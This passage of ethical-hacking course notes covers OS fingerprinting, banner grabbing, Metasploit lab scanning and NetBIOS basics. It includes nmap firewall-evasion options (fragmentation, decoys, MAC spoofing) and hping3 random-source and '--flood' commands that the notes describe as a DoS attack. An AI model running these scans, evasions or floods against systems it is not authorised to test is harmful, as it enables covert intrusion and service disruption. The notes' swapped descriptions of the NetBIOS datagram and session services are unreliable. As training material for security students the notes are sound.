</p></details></li></ul><ul id="0d40e41f-cca5-4485-b65f-94ee1712ea4a" class="toggle"><li><details open=""><summary>OS Discovery</summary><p id="7d9ca2fe-d5a1-4c13-9568-a9068e800c59" class="">This is the next step after discovering open ports and services</p><p id="6879534d-6c70-4b2a-9767-b47746219fcc" class="">To discover OS there are two ways:<div class="indented"><ul id="33d70384-0c47-428d-9598-46a7ccf80393" class="bulleted-list"><li style="list-style-type:disc">Active Banner Grabbing;<ul id="2a427696-be2f-4c00-95c5-3b98cc756242" class="bulleted-list"><li style="list-style-type:circle">craft packets and observe responses</li></ul><ul id="15f9f3c1-9bca-4000-a12f-2ab6ef4d408e" class="bulleted-list"><li style="list-style-type:circle">responses are compared to a database of known idfferences in TCP/IP implementation</li></ul></li></ul><ul id="d7c765bf-d903-406d-b35f-2b5d0e29b8b9" class="bulleted-list"><li style="list-style-type:disc">Passive Banner Grabbing:<ul id="00894cba-e045-4fbd-a99b-36ac5541a358" class="bulleted-list"><li style="list-style-type:circle">error messages (eg. in websites)</li></ul><ul id="821768c3-e181-4c5a-bbbc-4f4a0c7a3af8" class="bulleted-list"><li style="list-style-type:circle">sniffing traffic</li></ul><ul id="fce9e6d0-6fa1-4403-8d70-415dbb4f6ce3" class="bulleted-list"><li style="list-style-type:circle">page extensions</li></ul></li></ul></div></p><p id="0e07088d-0df6-4aac-af22-f66d7d8532c5" class="">
</p><ul id="c3dacb7f-d9f5-4ded-9d8e-2969b019095d" class="toggle"><li><details open=""><summary>Wireshark - Identify OS using TTL</summary><ul id="803c1f03-eb35-4958-a1a0-0b2afa0eab52" class="bulleted-list"><li style="list-style-type:disc">Open wireshark → Ping target in CMD → Filter ICMP → Observe ICMP Reply → Internet Protocol Version 4 → Time To Live</li></ul><ul id="44b648d9-a649-4942-83ff-63a7bf798fb0" class="toggle"><li><details open=""><summary>Identify OS using the following table</summary><figure id="5fcd531a-1903-425a-b2ec-97bf575a5ed9" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2089.png"><img style="width:647.2000122070312px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2089.png"/></a></figure><p id="442b1990-5ba3-4e21-bbf2-7d00035f09d4" class="">
</p></details></li></ul><ul id="bdd500a7-028f-43b3-8f8f-d37ec23d9eda" class="bulleted-list"><li style="list-style-type:disc">If its not in the table, it means they have changed the default one<ul id="19c6c299-4c9b-45e3-ab3d-d4e3f6df2f4c" class="bulleted-list"><li style="list-style-type:circle">Windows: using registry</li></ul><ul id="988ac119-9e79-4112-9ade-612ed034c182" class="bulleted-list"><li style="list-style-type:circle">Linux: iptables</li></ul></li></ul></details></li></ul><ul id="62f05ea5-1744-4dd6-b71f-6349c8329397" class="toggle"><li><details open=""><summary>Nmap - Identify OS using Script Engine (NSE)</summary><ul id="69c536da-fd55-4b17-9fce-afeebf1768d5" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -A &lt;target&gt;</code><ul id="f5b1dea9-2864-4d6f-884c-8cbac8e0dad4" class="bulleted-list"><li style="list-style-type:circle"><code>-A</code> aggressive scan</li></ul><ul id="9d123e35-1633-453d-9e66-efe3b3dfa97c" class="bulleted-list"><li style="list-style-type:circle">Open ports, running services, versions, OS, computer name etc</li></ul></li></ul><ul id="9adc53b5-aae1-4fd6-848e-f9e4a94dd8a9" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -O &lt;target&gt;</code><ul id="1b7851bf-1344-428a-aa4f-befd503a9bc4" class="bulleted-list"><li style="list-style-type:circle"><code>-O</code> OS Discovery</li></ul></li></ul><ul id="4120ac06-305b-4393-a58b-edb6661ca94f" class="bulleted-list"><li style="list-style-type:disc"><code>nmap --script smb-os-discovery.nse &lt;target&gt;</code><ul id="b659daf9-3167-4210-9855-c38eb2d1d067" class="bulleted-list"><li style="list-style-type:circle"><code>smb-os-discovery</code> tries to determine:<ul id="3652d02e-03db-4e5d-b05b-42ad16a01caf" class="bulleted-list"><li style="list-style-type:square">os, computer name, domain, workgroup, time</li></ul><ul id="8be3eac6-c092-43f4-8f30-f798a51faa71" class="bulleted-list"><li style="list-style-type:square">over SMB protocol 445 or 139 ports</li></ul></li></ul><ul id="3cdb2e94-946b-4c71-9883-7e034422131b" class="bulleted-list"><li style="list-style-type:circle">Works on Windows Server 2022</li></ul><p id="3a56667d-6ec9-4a15-9a96-5f0cc9fdaf7a" class="">
</p></li></ul></details></li></ul><ul id="d60f0857-1127-420b-9324-840fbcf57b8c" class="toggle"><li><details open=""><summary>Unicornscan </summary><p id="5af1e18a-6033-4da9-bcfc-85dacf02c581" class="">Asynchronous TCP and UDP port scanner and banner grabber</p><p id="48b069cc-8ea3-455f-9089-c16a3af39e69" class="">Enables you to discover open ports, services, TTL values, etc</p><p id="545dde24-863d-4191-b9b0-c234a40956ad" class="">
</p><ul id="b7bb5e44-6b45-4322-9e89-83b963ffdc4c" class="bulleted-list"><li style="list-style-type:disc"><code>unicornscan &lt;target&gt; -Iv</code><ul id="447fae79-ea7d-41f6-be9d-b7c0408146d2" class="bulleted-list"><li style="list-style-type:circle"><code>-I</code> immediate mode</li></ul><ul id="03e73b01-2458-4424-b1e5-4248848467d8" class="bulleted-list"><li style="list-style-type:circle"><code>-v</code> verbose</li></ul><ul id="70f296c7-b74f-499c-aa4d-fa944257334e" class="bulleted-list"><li style="list-style-type:circle"><code>-p</code> not used here, but can set a list of ports<ul id="b358500d-3a6e-4b7c-b809-63d165df52ba" class="bulleted-list"><li style="list-style-type:square">otherwise it uses top known ports</li></ul></li></ul><ul id="39e6990d-08ae-444f-a888-0d711a544caa" class="bulleted-list"><li style="list-style-type:circle">records TTL on every port to identify OS<ul id="d28025da-9c58-4e20-826a-ef9cc18f1062" class="bulleted-list"><li style="list-style-type:square">there are cases where some ports have the changed TTL but some other ports are forgotten to be changed, so they have the original TTL of the OS which gives away the OS</li></ul></li></ul><ul id="10bb9d78-1490-40b6-b1ee-d6bb8efb9f22" class="toggle"><li><details open=""><summary>Identify OS using the following table</summary><figure id="39cdc0a4-dec5-40b3-911e-d979ece6fc14" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2089.png"><img style="width:377.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2089.png"/></a></figure><p id="2ee46f9d-d763-4f86-be0b-0e4c375ace91" class="">
</p></details></li></ul></li></ul></details></li></ul><ul id="9fd99ee5-b2fd-409a-8372-37a9b1c68b95" class="toggle"><li><details open=""><summary>Banner Grabbing on different Ports</summary><ul id="d2ec9289-d4fa-4abb-916f-fb7e3bb43bac" class="bulleted-list"><li style="list-style-type:disc">Use nmap service detection</li></ul><ul id="19bf1313-2fe0-47d5-83ad-1b9f83d14720" class="bulleted-list"><li style="list-style-type:disc">For ssh: <code>nc -vn &lt;target&gt; 22</code></li></ul></details></li></ul><p id="4dd4dca3-842c-46ff-99eb-152ef8a3820a" class="">
</p></details></li></ul><ul id="eedb9cc7-8628-4de7-b757-6f8151cd0bb5" class="toggle"><li><details open=""><summary>Scan beyond IDS and Firewall</summary><ul id="a7c3b4e7-a47f-42a4-a9ed-b2e73d80cd8a" class="toggle"><li><details open=""><summary>Evasion Techniques</summary><ul id="8726a262-a74c-408e-8e74-0445f4f4555c" class="bulleted-list"><li style="list-style-type:disc"><strong>Packet Fragmentation</strong>: Send fragmented probe packets to the intended target, which re-assembles it after receiving all the fragments</li></ul><ul id="5ad8a43f-5033-4703-ae2f-7d8ca2768fb4" class="bulleted-list"><li style="list-style-type:disc"><strong>Source Routing</strong>: Specifies the routing path for the malformed packet to reach the intended target</li></ul><ul id="feaa5f1a-ef4d-4e35-a656-2ebc77f90010" class="bulleted-list"><li style="list-style-type:disc"><strong>Source Port Manipulation</strong>: Manipulate the actual source port with the common source port to evade IDS/firewall</li></ul><ul id="d1141c63-106d-474e-a89e-ac8d041057bc" class="bulleted-list"><li style="list-style-type:disc"><strong>IP Address Decoy</strong>: Generate or manually specify IP addresses of the decoys so that the IDS/firewall cannot determine the actual IP address</li></ul><ul id="69c49a77-be08-4c41-a4e1-5880223e05e2" class="bulleted-list"><li style="list-style-type:disc"><strong>IP Address Spoofing</strong>: Change source IP addresses so that the attack appears to be coming in as someone else</li></ul><ul id="8598a670-ce21-4262-8d0d-bd976f52156d" class="bulleted-list"><li style="list-style-type:disc"><strong>Creating Custom Packets</strong>: Send custom packets to scan the intended target beyond the firewalls</li></ul><ul id="d028093f-5ebc-4188-be2a-b2a4f9b77de3" class="bulleted-list"><li style="list-style-type:disc"><strong>Randomizing Host Order</strong>: Scan the number of hosts in the target network in a random order to scan the intended target that is lying beyond the firewall</li></ul><ul id="aed1ca43-79b8-4dd3-87ce-d7ac708c3e0c" class="bulleted-list"><li style="list-style-type:disc"><strong>Sending Bad Checksums</strong>: Send the packets with bad or bogus TCP/UPD checksums to the intended target</li></ul><ul id="da29e95d-6c21-4d81-bbc3-957c39dd8561" class="bulleted-list"><li style="list-style-type:disc"><strong>Proxy Servers</strong>: Use a chain of proxy servers to hide the actual source of a scan and evade certain IDS/firewall restrictions</li></ul><ul id="d96bb1c2-1ae5-4f2c-8426-2b3bf2bba4ac" class="bulleted-list"><li style="list-style-type:disc"><strong>Anonymizers</strong>: Use anonymizers that allow them to bypass Internet censors and evade certain IDS and firewall rules</li></ul></details></li></ul><p id="0d0d98e7-a989-420d-b09f-c4e8c1bfce3d" class="">
</p><ul id="dca2a3fc-f19b-4081-8f76-3f4841070fe6" class="toggle"><li><details open=""><summary>Nmap</summary><ul id="34ab2d83-2c0f-478e-b5ae-e9a9254b2904" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -f &lt;target&gt;</code><ul id="dbfa8118-fcb0-4561-8a44-437201ba9c16" class="bulleted-list"><li style="list-style-type:circle"><code>-f</code> used to split the IP packet to tiny fragments</li></ul><ul id="85869e8d-9d2a-4e21-97b6-7005c2943d23" class="bulleted-list"><li style="list-style-type:circle">IDS/FW queue all of them to process them</li></ul><ul id="e2798d47-ed5e-44a1-ac25-feb77987547c" class="bulleted-list"><li style="list-style-type:circle">But it uses alot of CPU so most of them skip such packets</li></ul><ul id="df2f144c-9f6a-456e-9213-d5925e804c07" class="bulleted-list"><li style="list-style-type:circle"><strong>Note:</strong> this also works on windows firewall</li></ul></li></ul><ul id="d99f08bd-db42-48a7-95d9-ba759fa17467" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -g &lt;source port&gt; &lt;target&gt;</code><ul id="03297b70-b3c0-4260-806b-8a63a8b240d9" class="bulleted-list"><li style="list-style-type:circle"><code>-g</code> or <code>--source-port</code> performs source port manipulation</li></ul><ul id="5eb44908-e323-4935-87ab-1f6527e9f5c5" class="bulleted-list"><li style="list-style-type:circle">FWs can be configured to allow packets only from known ports like HTTP, DNS, FTP etc</li></ul></li></ul><ul id="b08162d1-52f0-4181-9245-deff041f52ff" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -mtu 8 &lt;target&gt;</code><ul id="63dd7722-e948-4785-ae9b-8bd791f1d823" class="bulleted-list"><li style="list-style-type:circle"><code>-mtu</code> sets the Maximum Transition Unit (8 bytes here)</li></ul><ul id="6dc08f88-1c00-468d-9978-cee790d6d22c" class="bulleted-list"><li style="list-style-type:circle">This way, smaller packets are transmitted just like with <code>-f</code></li></ul><ul id="81ca93d6-3048-4d73-bef5-c2e1ce6298d8" class="bulleted-list"><li style="list-style-type:circle">but this time we define the size of the packets</li></ul></li></ul><ul id="a88d9783-d7df-4f36-9069-6bef654b2d8f" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -D RND:10 &lt;target&gt;</code><ul id="1a3a9d12-f893-4dae-9ea4-bae1c1d4fd9f" class="bulleted-list"><li style="list-style-type:circle"><code>-D</code> decoy scan</li></ul><ul id="0bf0831f-3a7e-43eb-ac77-18b87f546a0d" class="bulleted-list"><li style="list-style-type:circle"><code>RND:10</code> generates 10 random non-reserved IP address</li></ul><ul id="3f2a9f1f-a0c0-4e44-af2c-0bc219aa4361" class="bulleted-list"><li style="list-style-type:circle">Sends scan packets but also sends 10 same decoy packets in random orders</li></ul><ul id="52e9b944-167f-4c0a-8660-61551eb64568" class="bulleted-list"><li style="list-style-type:circle">Used to make it difficult for IDS/FW to determine who is scanning</li></ul></li></ul><ul id="eaf8d878-4f42-4b36-9398-ed6b103ec8bd" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sT -Pn --spoof-mac 0 &lt;target&gt;</code><ul id="08bed478-58ae-4f3b-9835-dbd17b599260" class="bulleted-list"><li style="list-style-type:circle"><code>--spoof-mac</code> used to change source mac (0 for random)</li></ul><ul id="20951ea5-c70a-4107-a718-8abe30333162" class="bulleted-list"><li style="list-style-type:circle"><code>-sT</code> TCP full conect scan</li></ul><ul id="45b10d75-624e-4653-9182-02e87b2c90ed" class="bulleted-list"><li style="list-style-type:circle"><code>-Pn</code> skip host discovery</li></ul><ul id="b9d83fbb-77d6-457a-939e-23e35afb2ee2" class="bulleted-list"><li style="list-style-type:circle">Can spoof mac to pretend a legitimate host on the network</li></ul><p id="5d4eacb4-3317-4f11-aaf5-87ffbbbc4ae1" class="">
</p></li></ul></details></li></ul><ul id="ba0682d6-62f1-4072-9a86-42daefb92123" class="toggle"><li><details open=""><summary>Colasoft Packet Builder 2.0</summary><p id="1d114e2e-e81f-447c-82b7-419f0f186da0" class="">Can be used to:<div class="indented"><ul id="822767d8-234e-48a5-bd96-bfc100885938" class="bulleted-list"><li style="list-style-type:disc">Create specially crafted packets <ul id="b3367147-ffc7-48a1-a013-6d5dc1fbbbd5" class="bulleted-list"><li style="list-style-type:circle">usually to bypass FW/IDS</li></ul></li></ul><p id="4914e010-b053-45d1-9599-1e55680d083f" class="">
</p></div></p><p id="ba9b0b87-491e-43bd-bb99-a3e1ed87cedc" class="">Instructions</p><ul id="d44f632c-7ef3-47f1-8795-0b34a9991daf" class="bulleted-list"><li style="list-style-type:disc">Adapter → Choose Adapter</li></ul><ul id="d1c4c9bb-172e-434c-9079-b56ddcb2c6f6" class="bulleted-list"><li style="list-style-type:disc">Add → ARP Packet, 0,1 second delta time</li></ul><ul id="43b011b9-579d-4bea-8079-e2e363400be0" class="bulleted-list"><li style="list-style-type:disc">It has a packet editor for both hex and text</li></ul><ul id="ad4ffe5b-c695-4ccb-96bd-68b19455f6d4" class="bulleted-list"><li style="list-style-type:disc">Send → Burst Mode → Start<ul id="a850d3d4-7fca-49c8-b1c9-bee1d44c4276" class="bulleted-list"><li style="list-style-type:circle">Sends the packet (broadcast) to the network</li></ul><ul id="3f41e93c-dc25-4e30-b6b0-89562f338ff9" class="bulleted-list"><li style="list-style-type:circle">Responses can be seen in wireshark</li></ul></li></ul></details></li></ul><ul id="d3ea3a7e-4b55-4fcb-8104-f3b7a0902b2a" class="toggle"><li><details open=""><summary>Hping3</summary><p id="4bd7d10e-269f-4abc-b5e2-e4ff87fc8151" class="">Will be used to create custom UDP and TCP packets to evade IDS/FW</p><p id="b586d103-2b8f-4a93-8f84-3e0fb669d386" class="">
</p><ul id="4912fdf0-ab9b-4a61-a69f-15770231bdd2" class="bulleted-list"><li style="list-style-type:disc"><code>hping3 &lt;target&gt; --udp --rand-source --data 500</code><ul id="6573d4fe-072e-4ccb-9842-efc07c4c59f2" class="bulleted-list"><li style="list-style-type:circle"><code>--udp</code> send udp packets</li></ul><ul id="cf7d136e-4681-496e-894d-4f560ed1fb04" class="bulleted-list"><li style="list-style-type:circle"><code>--rand-source</code> uses random ip addresses as source</li></ul><ul id="4fc502ae-9f55-4143-b68d-b074cab6e0d6" class="bulleted-list"><li style="list-style-type:circle"><code>--data</code> packet body size</li></ul><ul id="9235dc3f-ba7b-4a5a-9794-1ad088708b26" class="bulleted-list"><li style="list-style-type:circle">we don’t want to receive anything back, just to stress the firewall state tables and other ip-based tables</li></ul><ul id="cfa049ac-600e-4dcd-aa7c-f507ff6f1839" class="bulleted-list"><li style="list-style-type:circle">it is used mostly as a dos attack</li></ul><ul id="0d33456b-61a4-4351-8f05-c90120c676e4" class="bulleted-list"><li style="list-style-type:circle">we randomise source so its difficult to trace the source of the traffic</li></ul></li></ul><ul id="b1c9ae5f-01ef-4be6-88c3-f974af095969" class="bulleted-list"><li style="list-style-type:disc"><code>hping3 -S &lt;target&gt; -p 80 -c 5</code><ul id="025b5f40-8db5-4fd2-ae54-b42c0b493190" class="bulleted-list"><li style="list-style-type:circle"><code>-S</code> TCP SYN request</li></ul><ul id="82a39c32-93f4-42b7-bb12-f2509556a8cf" class="bulleted-list"><li style="list-style-type:circle"><code>-p</code> specify port</li></ul><ul id="a5ca5665-2631-4d0f-8e10-6724b16cbe9f" class="bulleted-list"><li style="list-style-type:circle"><code>-c</code> count of packets</li></ul><ul id="da07a8c3-25ff-437b-88a1-3f3b64dd6924" class="bulleted-list"><li style="list-style-type:circle">sends tcp syn packets</li></ul><ul id="2695ac2e-6995-4cbf-9db0-476b43822658" class="bulleted-list"><li style="list-style-type:circle">used for tcp pinging and observing response info</li></ul></li></ul><ul id="4859abde-da3f-4983-8a47-01b69335af54" class="bulleted-list"><li style="list-style-type:disc"><code>hping3 &lt;target&gt; --flood</code><ul id="43c1f649-7f49-44c9-ab33-ddc206a38341" class="bulleted-list"><li style="list-style-type:circle">performs tcp flooding</li></ul><ul id="adbb2f83-8189-4a50-96ff-01c07706fbae" class="bulleted-list"><li style="list-style-type:circle">uses port 0 and 0 len data</li></ul></li></ul><p id="94df77df-0f77-4303-b609-6016bd3923fc" class="">
</p><p id="5db1bb7e-be78-4f1a-ac6e-56b70d970b37" class="">Other Tools for this:<div class="indented"><ul id="3c96a61f-b91e-4632-a68d-92171cb6f4d8" class="bulleted-list"><li style="list-style-type:disc">NetScanToolsPro (netscantools.com)</li></ul><ul id="8e48c31a-99a5-4670-b5fd-89dd3bc0288b" class="bulleted-list"><li style="list-style-type:disc">Colasoft Packet Builder (colasoft.com)</li></ul></div></p></details></li></ul><p id="ff6a06ff-7eb3-47ce-a5d4-86a92833bda0" class="">
</p></details></li></ul><ul id="2697f2e0-2935-46f9-8385-c1c60a1703f1" class="toggle"><li><details open=""><summary>Network (Port) Scanning</summary><p id="1e103c24-be5a-4ef8-8383-d5d37eb8a090" class="">We will use Metasploit to discover active hosts, open ports, services running, and OS details of systems present in the target network.</p><p id="62af07c8-f380-408b-9592-d54c930e8a1c" class="">
</p><ul id="835e90ae-8ef1-4ebd-9db0-c2104ec0b073" class="toggle"><li><details open=""><summary>Set up msfconsole for hosts saving</summary><ul id="3ee07000-2990-4c4a-863c-7016cbc551c1" class="bulleted-list"><li style="list-style-type:disc"><code>service postgresql start</code> to start the database so that we can save host info</li></ul><ul id="8d93b6df-f14b-4fca-9482-cf2c4bee692a" class="bulleted-list"><li style="list-style-type:disc">Run <code>msfconsole</code> as root</li></ul><ul id="064447b4-3427-454f-af65-41d6da710552" class="bulleted-list"><li style="list-style-type:disc">Check connection with db<ul id="1d3bec8a-2834-4fb6-a76e-4f06148e6946" class="bulleted-list"><li style="list-style-type:circle">Type <code>db_status</code></li></ul><ul id="85b6115c-1753-4d6a-acc9-80d27f118eac" class="bulleted-list"><li style="list-style-type:circle">Should not return <code>[*] postgresql selected, no connection</code><ul id="a518adf9-7eb1-4644-bdd1-79a35a165e26" class="bulleted-list"><li style="list-style-type:square">if yes then <code>exit</code></li></ul><ul id="8ec6b581-6f32-46fa-9926-6bdf24f5b3a6" class="bulleted-list"><li style="list-style-type:square">Type <code>msfdb init</code></li></ul><ul id="608d36fd-af74-45a2-804d-03e27c093f82" class="bulleted-list"><li style="list-style-type:square"><code>service postgresql restart</code></li></ul><ul id="5e5b7d30-eed2-43ad-a7a3-a6d9ec9c84c1" class="bulleted-list"><li style="list-style-type:square">Open <code>msfconsole</code> again</li></ul><ul id="ffaf97c1-8fc8-4110-b0bf-a62799270dc5" class="bulleted-list"><li style="list-style-type:square">Should return <code>[*] Connected to msf</code></li></ul></li></ul></li></ul></details></li></ul><ul id="9c42a72c-2dfd-45c0-beac-9ae3af713975" class="toggle"><li><details open=""><summary>Save nmap scans in msf</summary><ul id="df635aa2-9493-4acb-bd0e-7f5e9a75aaa8" class="bulleted-list"><li style="list-style-type:disc">Run nmap inside msf<ul id="f93633d3-0b9a-40a5-b0bc-a8544f901546" class="bulleted-list"><li style="list-style-type:circle"><code>nmap -Pn -sS -A -oX Test 10.10.1.0/24</code><ul id="e62bc7d9-3958-4060-b41f-df3ce8d248ab" class="bulleted-list"><li style="list-style-type:square"><code>-Pn</code> treats all hosts as online</li></ul><ul id="d3c59b7b-65fd-4d8c-9c0e-9842f2167e94" class="bulleted-list"><li style="list-style-type:square"><code>-sS</code> TCP SYN</li></ul><ul id="716c26e0-f4dd-4a2b-b415-d78db2ea2909" class="bulleted-list"><li style="list-style-type:square"><code>-A</code>  OS detection, version detection, script scanning, traceroute</li></ul><ul id="5967e729-bf01-4667-a3b7-5085cb966e15" class="bulleted-list"><li style="list-style-type:square"><code>-oX</code> Output to xml file (named Test here)</li></ul><ul id="dd64ad1f-de28-4042-8af5-d0fb1bfc9741" class="bulleted-list"><li style="list-style-type:square">scans whole subnet with active hosts</li></ul></li></ul></li></ul><ul id="725dc13b-d13a-4f92-b6b7-de0f48527ac7" class="bulleted-list"><li style="list-style-type:disc"><code>db_import &lt;nmap filename&gt;</code> </li></ul><ul id="19c68923-e827-437c-a5b8-567edaf052b9" class="bulleted-list"><li style="list-style-type:disc">imports nmap data into database</li></ul><ul id="3628dcdf-2f47-4f29-b030-1dc5350af09e" class="bulleted-list"><li style="list-style-type:disc"><code>hosts</code> shows the list of hosts in the db and their info</li></ul><ul id="9297a201-59c1-48ac-b82f-e18b378d2f4d" class="bulleted-list"><li style="list-style-type:disc"><code>services</code> shows the list of services running on saved hosts</li></ul></details></li></ul><ul id="04067921-78fb-44ab-891c-f80feeaa3f24" class="toggle"><li><details open=""><summary>Use port scanning modules</summary><ul id="3412674c-ce1a-4f5c-ae19-d8659abada2d" class="bulleted-list"><li style="list-style-type:disc"><code>search portscan</code> searches for portscan modules</li></ul><ul id="82ec067e-f84a-4653-8dd3-085182e0748b" class="bulleted-list"><li style="list-style-type:disc"><code>use auxiliary/scanner/portscan/syn</code><ul id="64cdada5-128a-40e1-ba1f-e8d6f2af154e" class="bulleted-list"><li style="list-style-type:circle">Alternatively you can use the index result of the search: <code>use 7</code></li></ul><ul id="078fbe0c-bda6-42c5-b6da-0591b822d814" class="bulleted-list"><li style="list-style-type:circle">performs SYN scan for open ports on targets</li></ul><ul id="e002598b-d3a2-4e75-97ce-9a39c934d8b9" class="bulleted-list"><li style="list-style-type:circle">Set options<ul id="e25ea3bb-939b-44dc-9c3b-469460314ec6" class="bulleted-list"><li style="list-style-type:square"><code>set INTERFACE eth0</code></li></ul><ul id="b054a7cd-5e5a-48b1-9a20-6203e88f9656" class="bulleted-list"><li style="list-style-type:square"><code>set PORTS 80</code></li></ul><ul id="817a741a-690a-4406-90e0-3cbfa2097b3b" class="bulleted-list"><li style="list-style-type:square"><code>set RHOSTS 10.10.1.5-23</code></li></ul><ul id="a18927c0-10e3-465b-9173-cf43ab7472fc" class="bulleted-list"><li style="list-style-type:square"><code>set THREADS 50</code></li></ul></li></ul><ul id="ff4fd9e5-cdd2-4a59-ae00-e7eb855371c9" class="bulleted-list"><li style="list-style-type:circle"><code>run</code><ul id="95fdc3e6-0114-4bbe-a07f-0f45e6dfbcf3" class="bulleted-list"><li style="list-style-type:square">Results will give which IP’s have the specified oports open</li></ul></li></ul></li></ul><ul id="c0a01888-6ec4-40d6-8ef7-7069d5da09f6" class="bulleted-list"><li style="list-style-type:disc"><code>use auxiliary/scanner/portscan/tcp</code><ul id="49b08d95-5706-4d01-8d1c-7685c98cd87c" class="bulleted-list"><li style="list-style-type:circle"><code>hosts -R</code> sets the RHOSTS as all the hosts saved in the database</li></ul><ul id="3abfda19-521d-4a17-b52c-e5d08e5b9c88" class="bulleted-list"><li style="list-style-type:circle"><code>run</code><ul id="7ff3a92f-0203-46ee-801b-d50584b05f62" class="bulleted-list"><li style="list-style-type:square">scans for open tcp ports</li></ul></li></ul></li></ul></details></li></ul><ul id="53afc35f-ee4a-4cb6-8262-28d60e2d1c11" class="toggle"><li><details open=""><summary>Determine OS by scanning SMB (445 open)</summary><ul id="dac12397-75dc-40a4-bbe8-4b4d40dc0ccf" class="bulleted-list"><li style="list-style-type:disc"><code>use auxiliary/scanner/smb/smb_version</code><ul id="86a8b7eb-368d-4867-aa29-d94738738b04" class="bulleted-list"><li style="list-style-type:circle"><code>set rhosts 10.10.1.5-23</code></li></ul><ul id="eb5dac4f-d7b6-4394-8cd3-9031670af090" class="bulleted-list"><li style="list-style-type:circle"><code>set threads 11</code></li></ul><ul id="a1b0d6aa-cefe-4a20-9b1b-7ce58ab349bf" class="bulleted-list"><li style="list-style-type:circle"><code>run</code></li></ul></li></ul><p id="a361fed0-c502-4a69-9308-b8e6f8651e45" class="">
</p><p id="7b5ca6ad-44a3-441e-9a41-b488cb54f47b" class="">
</p></details></li></ul></details></li></ul></details></li></ul><ul id="0f034937-392e-454c-b431-57641eda5ed2" class="toggle"><li><details open=""><summary>Lab 3 - Enumeration</summary><p id="d57caa35-3e66-4b8d-a51a-942c5d0c4133" class="">This is the third step where we  extract more details about the network<div class="indented"><ul id="ce62dd10-08d1-4c68-8017-d309b7353f5e" class="toggle"><li><details open=""><summary>Steps so far</summary><ul id="deb58a74-5d30-4718-bb2a-80c7346dddce" class="bulleted-list"><li style="list-style-type:disc">Gather open info</li></ul><ul id="e93dbe5e-841f-419b-8538-3501ca39aa1a" class="bulleted-list"><li style="list-style-type:disc">Collect info on open ports services and OSes</li></ul><ul id="31c2aa52-6a5b-4726-8524-eba597e3efdd" class="bulleted-list"><li style="list-style-type:disc">Enumerate details such as computers, usernames, resources, services</li></ul></details></li></ul></div></p><p id="90abf052-3e79-499f-a2c2-423a8a6e5cb8" class="">In this step, we gather info to identify potential vulnerabilities</p><p id="d25a526b-04d6-40cd-b480-e45df8088bf1" class="">Enumeration creates an active connection with the system and performs directed queries to gain more information about the target.</p><p id="9aff21f9-d42f-4fa2-8b4f-eb912ecf8fe4" class="">This is where legal boundaries start</p><p id="2415fc76-b908-4f1a-9123-ff05b6e70713" class="">
</p><ul id="426080ab-48be-4163-919e-d9cb3dd19ceb" class="toggle"><li><details open=""><summary>NetBIOS Enumeration</summary><ul id="cde561fe-a2ab-46d2-a436-51e085947c71" class="toggle"><li><details open=""><summary>Info</summary><p id="0f935c99-b745-4c51-9482-5a49a793773b" class="">NetBIOS is an API that allows applications on different computers to communicate within a local network. It provides services related to the session layer of the OSI model, making it easier to establish and manage network connections.</p><p id="16863848-b097-4009-9bb1-7332041cc5d7" class="">When it exists, it allows you to collect information about the target such as a list of computers that belong to a target domain, shares on individual hosts in the target network, policies, passwords, etc</p><p id="7d311886-92aa-48a3-8978-090ba0a1cdea" class="">The target must have NetBIOS enabled in their adapter for enumeration to work, but windows enables it by default when print and file share is allowed</p><p id="42455ebd-725e-4bd7-8c9f-3dbe9472747a" class="">
</p><ul id="783c7ddf-8bae-47bc-adb0-69d97be3ccf7" class="bulleted-list"><li style="list-style-type:disc">NetBios services and ports:<ul id="5de7f3f4-7ba2-461e-a9c2-4a4ed8a3afa4" class="toggle"><li><details open=""><summary>NETBIOS Name Service - NBNS (UDP: 137)</summary><p id="55ee15a4-14ca-4bc7-a014-ba74ce80d5f2" class="">This service allows a device to be identified by a human-readable name of up to 15 characters long. Devices can register their names on the network and resolve other devices&#x27; names to IP addresses.</p><ul id="84954ab3-b395-4186-8603-5692b9741cc7" class="bulleted-list"><li style="list-style-type:disc"><strong>Purpose</strong>: Resolves NetBIOS names to IP addresses, allowing devices to locate each other by name.</li></ul><ul id="4a204cad-0422-441c-bfb2-3e23a227f7be" class="bulleted-list"><li style="list-style-type:disc"><strong>Operation</strong>: Uses broadcast or multicast messages for name registration and resolution within the local network segment.</li></ul><ul id="cfb9981c-7145-461d-aba5-538c510c8511" class="bulleted-list"><li style="list-style-type:disc"><strong>Ports</strong>: Operates on UDP port 137.</li></ul></details></li></ul><ul id="a0c821ca-c343-4e9b-9768-d20698cad216" class="toggle"><li><details open=""><summary>NETBIOS Datagram Service - NBDS (UDP: 138)</summary><p id="7af20639-17d0-42c8-966f-3a5b6849f162" class="">This facilitates connection-oriented communication between two devices on the network. It establishes, maintains, and terminates sessions between hosts.</p><ul id="5c4c66bb-499b-4fea-b917-ffa0f720b363" class="bulleted-list"><li style="list-style-type:disc"><strong>Purpose</strong>: Supports connectionless communication using datagrams, allowing for simple messaging and service announcements.</li></ul><ul id="a0a651c9-7076-4fa0-ad29-3d7a2f12db10" class="bulleted-list"><li style="list-style-type:disc"><strong>Operation</strong>: Facilitates discovery of network resources and sends broadcast messages.</li></ul><ul id="607a0966-c8b4-4533-9569-a4f5ed287024" class="bulleted-list"><li style="list-style-type:disc"><strong>Ports</strong>: Operates on UDP port 138.</li></ul></details></li></ul><ul id="4364689e-1c71-4dcc-84e0-665721cd87bc" class="toggle"><li><details open=""><summary>NETBIOS Session Service - NBSS(TCP: 139)</summary><p id="e532504e-86a5-47ea-9941-33b9b5a3c02c" class="">This supports connectionless communication for sending and receiving data packets.</p><ul id="583a990c-7a55-4e53-94f1-74de63343613" class="bulleted-list"><li style="list-style-type:disc"><strong>Purpose</strong>: Establishes and maintains a session for reliable communication between two devices, enabling file and print sharing.</li></ul><ul 